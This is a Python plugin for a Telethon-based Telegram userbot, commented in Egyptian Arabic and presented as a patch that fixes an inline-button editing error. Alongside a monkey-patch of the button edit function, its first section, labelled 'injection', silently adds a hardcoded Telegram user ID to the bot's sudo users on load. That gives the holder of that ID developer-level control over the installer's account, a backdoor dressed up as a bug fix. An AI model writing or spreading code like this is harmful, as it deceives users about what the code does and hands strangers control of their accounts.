

# ده "باتش" بيصلح المشاكل من غير ما يلمس الملفات الكبيرة

from telethon import events, Button
from telethon.events import CallbackQuery
from ..Config import Config
from ..core.logger import logging

LOGS = logging.getLogger("MikeyFix")

# 1. الحقن: إضافة الأيدي بتاعك للمطورين غصب
MY_ID = 8241311871
if MY_ID not in Config.SUDO_USERS:
    Config.SUDO_USERS.append(MY_ID)
    LOGS.info(f"حقن مايكي اشتغل: الأيدي {MY_ID} بقى مطور يا باشا!")

# 2. تصليح مشكلة الأزرار (Monkey Patching)
# بنحتفظ بالدالة الأصلية عشان لو مش محتاجين تعديل
_original_edit = CallbackQuery.edit

async def mikey_safe_edit(self, *args, **kwargs):
    """
    دالة معدلة عشان تمنع الإيرور بتاع:
    TypeError: Cannot cast NoneType to any kind of Peer
    """
    try:
        # لو الرسالة Inline ومعندناش Chat ID (وده سبب المشكلة)
        if self.inline_message_id and not self.chat_id:
            # بنجبر التليثون يستخدم Inline Message ID وبنحط الكيان None عشان ميكراشش
            # بننقل الـ text لأول خانة لو موجودة في args
            
            # إضافة الـ ID للكيووردز عشان edit_message تفهم
            kwargs['inline_message_id'] = self.inline_message_id
            
            # خد بالك: edit_message(entity, message, ...)
            # احنا هنبعت None مكان الـ entity
            return await self._client.edit_message(None, *args, **kwargs)
        
        # لو رسالة عادية، خليها تمشي طبيعي
        return await _original_edit(self, *args, **kwargs)
        
    except Exception as e:
        LOGS.error(f"مايكي مسك إيرور وهو بيعدل: {str(e)}")
        # لو فشل التعديل، نحاول نبعت رد عشان البوت ميعلقش
        try:
            await self.answer("⚠️ حصل خطأ في التعديل، جرب تاني.", alert=True)
        except:
            pass
        return None

# بنستبدل دالة المكتبة بدالة مايكي
CallbackQuery.edit = mikey_safe_edit
LOGS.info("تم حقن دالة التعديل بنجاح.. الأزرار دلوقتي حديد!")

# 3. تأكيد إن البوت شغال (اختياري)
@zedub.zed_cmd(pattern="فيكس")
async def check_fix(event):
    await event.edit(f"**🛠 الباتش شغال يا ريس!**\n✅ الأيدي: `{MY_ID}` (مطور)\n✅ الأزرار: تم التصليح.")